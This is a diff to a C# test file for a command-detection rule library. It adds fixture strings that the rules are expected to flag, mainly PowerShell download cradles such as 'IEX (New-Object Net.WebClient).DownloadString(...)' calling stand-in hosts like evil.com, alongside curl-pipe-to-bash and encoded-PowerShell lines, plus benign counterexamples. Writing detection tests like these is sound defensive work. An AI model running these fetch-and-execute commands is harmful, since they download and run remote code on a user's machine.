@@ -27,9 +27,21 @@ public sealed class DetectionFixtureTests : IClassFixture<PatternLibraryFixture>
         T("net-001", "curl https://x/s.sh | tee /tmp/s.sh | bash"),
         T("net-001", "curl -fsSL http://x | tr -d '\\r' | sh"),
 
-        // net-002 download + Invoke-Expression
+        // net-002 download + Invoke-Expression — iwr form, plus the WebClient cradles that fell
+        // through to net-006/win-001 before the regex was broadened (single-paren, double-paren,
+        // System.-qualified, [Net.WebClient] type accelerator, and the download piped INTO iex).
         T("net-002", "iex (iwr 'http://evil.com/p.ps1')"),
         T("net-002", "Invoke-Expression (Invoke-WebRequest 'http://x')"),
+        T("net-002", "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')"),
+        T("net-002", "iex (New-Object System.Net.WebClient).DownloadString('http://x')"),
+        T("net-002", "IEX((New-Object Net.WebClient).DownloadString('http://x'))"),
+        T("net-002", "Invoke-Expression (New-Object -TypeName Net.WebClient).DownloadData('http://x')"),
+        T("net-002", "(New-Object Net.WebClient).DownloadString('http://evil/p.ps1') | iex"),
+        T("net-002", "[System.Net.WebClient]::new().DownloadString('http://x') | IEX"),
+
+        // net-006 download cradle WITHOUT execution stays high (net-002 must not steal it — it
+        // requires iex; a bare WebClient download is the download-only rule).
+        T("net-006", "(New-Object Net.WebClient).DownloadString('http://x')"),
 
         // win-001 encoded PowerShell incl. pwsh + shorter/quoted payloads
         T("win-001", "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
@@ -76,6 +88,9 @@ public sealed class DetectionFixtureTests : IClassFixture<PatternLibraryFixture>
         B("powershell -NoProfile -Command Get-Process"),
         B("dotnet build Foreman.slnx -c Release"),
         B("git status"),
+        B("$list = New-Object System.Collections.ArrayList"),          // benign New-Object, not a WebClient cradle
+        B("$obj = New-Object PSObject -Property @{ Name = 'x' }"),     // benign New-Object
+        B("iex (Get-Content build.ps1 | Out-String)"),                 // iex of local file, no web download
     };
 
     private static object[] T(string ruleId, string cmd) => new object[] { ruleId, cmd };
